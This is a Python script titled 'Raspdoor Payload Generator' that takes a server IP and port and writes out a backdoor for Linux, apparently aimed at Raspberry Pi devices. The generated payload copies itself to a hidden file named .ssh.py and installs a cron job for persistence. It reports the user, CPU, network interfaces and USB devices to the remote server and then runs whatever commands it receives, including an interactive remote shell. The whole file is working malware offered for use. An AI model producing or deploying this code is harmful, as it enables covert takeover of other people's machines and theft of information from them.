import subprocess

baner = """  _____                 _____   ____   ____  _____  
 |  __ \               |  __ \ / __ \ / __ \|  __ \ 
 | |__) |__ _ ___ _ __ | |  | | |  | | |  | | |__) |
 |  _  // _` / __| '_ \| |  | | |  | | |  | |  _  / 
 | | \ \ (_| \__ \ |_) | |__| | |__| | |__| | | \ \ 
 |_|  \_\__,_|___/ .__/|_____/ \____/ \____/|_|  \_|
                 | |                                
                 |_|                                
                 """

subprocess.run("clear")
print(baner)
print("Raspdoor Payload Generator")
ip = str(input('Enter server ip: '))
port = str(input('Enter server port: '))
payload_name = str(input("Enter payload name without extension: "))

with open(f'payload/{payload_name}.py', 'w') as f:
    f.write("""import socket, json
import os
import subprocess
import sys

SERVER_HOST = '%s'
SERVER_PORT = %s
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>" 


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

snd = []
chk = (subprocess.getoutput('crontab -l'))
if 'usr/bin/python' in chk:
    status = 2
else:
    try:
        subprocess.getoutput(f'cp ./client.py /home/{os.getlogin()}/.config/.ssh.py')
        subprocess.getoutput(f'cd  /home/{os.getlogin()}/.config/')
        subprocess.getoutput('crontab -l > tst')
        subprocess.getoutput(f'echo "*/10 * * * * /usr/bin/python /home/{os.getlogin()}/.config/.ssh.py" >> tst')
        subprocess.getoutput(f'crontab tst')
        subprocess.getoutput(f'rm tst')
        status = 1
    except:
        status = 3

if status == 1:
    snd.append('Added')
elif status == 2:
    snd.append('Working')
else:
    snd.append('Not Working')

cpu_m = subprocess.getoutput('cat /proc/cpuinfo | grep "model name" | uniq')
vendor_id = subprocess.getoutput('lscpu | grep "Vendor ID"')
temp = subprocess.getoutput('vcgencmd measure_temp')
intf = subprocess.getoutput("ip -o link show | awk -F': ' '{print $2}'")
uname = subprocess.getoutput("uname -a").split('#')[0]
arch = subprocess.getoutput("lscpu | grep Architecture").split(':')[1].replace(' ','')
usb = subprocess.getoutput("lsusb")

data = json.dumps({
                "cwd": os.getcwd(), 
                "usr": os.getlogin(), 
                "cron": snd[0],
                "cpu_m": cpu_m,
                "vendor": vendor_id,
                "temp": temp[5:],
                "intf": intf,
                "arch": arch,
                "usb": usb,
                })

s.send(data.encode())


while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command == 'shell':
        while True:
            command = s.recv(BUFFER_SIZE).decode()

            if command.lower() == "exit":
                break
            if command.startswith("cd "):
                try:
                    os.chdir(f'{os.getcwd()}/{str(command[3:])}')
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                output = subprocess.getoutput(command)
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
            if command == 'exit':
                break
    else:
        if command.lower() == "exit":
            break
        else:
            output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        try:
            s.send(message.encode())
        except BrokenPipeError:
            print('[!] Not allowed.')
            break
s.close()
""" % (ip, port))

print(f"Payload {payload_name}.py successfully generated in payload folder")